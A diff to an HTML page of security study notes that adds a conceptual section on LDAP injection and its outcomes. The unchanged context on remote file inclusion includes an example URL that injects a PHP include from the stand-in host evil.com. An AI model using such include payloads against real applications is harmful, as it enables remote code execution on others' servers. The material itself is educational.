@@ -183,3 +183,16 @@ a remote file instead of a presumably trusted file from the local file system. M
 of the malicious file. PHP is particularly vulnerable to these attacks because of the extensive use of "file includes" in PHP programming and default server configurations. </p>
 <p>If the application ends with a php extension, and if a user requests it, then the application interprets it as a PHP script and executes it. This allows an attacker to perform arbitrary commands:</p>
 <p>http://www.certifiedhacker.com/orders.php?DRINK=http://evil.com/exploit?</p>
+
+<h2>LDAP Injection Attacks</h2>
+<p>LDAP Directory Services store and organize information based on <b>attributes</b>. The information is hierarchically organized as a tree of directory entries. The <b>Lightweight Directory Access Protocol</b>
+is based on the client-server model, and clients can search the directory entries using filters.</p>
+<p>An LDAP injection attack works in the same way as an SQL injection attack, but it exploits user parameters to generate an LDAP query. It runs on an Internet transport protocol such as TCP, and it is an 
+open-standard protocol for manipulating and querying Directory Services. An LDAP injection technique is used to take advantage of non-validated web application input vulnerabilities to pass LDAP filters used 
+for searching Directory Services to obtain direct access to databases behind an LDAP tree.</p>
+<p><ol>
+ <ul>Login bypass</ul>
+ <ul>Information disclosure</ul>
+ <ul>Privilege escalation</ul>
+ <ul>Information alteration</ul>
+</ol></p>
